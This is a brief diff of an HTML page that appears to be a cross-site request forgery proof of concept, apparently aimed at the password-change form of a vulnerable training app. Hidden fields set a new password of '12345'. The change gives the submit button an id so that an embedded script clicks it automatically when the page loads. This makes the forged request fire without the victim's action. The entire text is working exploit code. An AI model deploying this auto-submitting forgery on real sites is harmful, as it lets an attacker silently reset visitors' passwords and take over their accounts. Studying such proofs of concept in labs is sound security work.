@@ -11,7 +11,7 @@
       <input type="hidden" name="password&#95;new" value="12345" />
       <input type="hidden" name="password&#95;conf" value="12345" />
       <input type="hidden" name="Change" value="Change" />
-      <input type="submit" value="Submit request" />
+      <input type="submit" value="Submit request" id="onclick_1" />
     </form>
     <script type="text/javascript">
       document.getElementById("onclick_1").click();
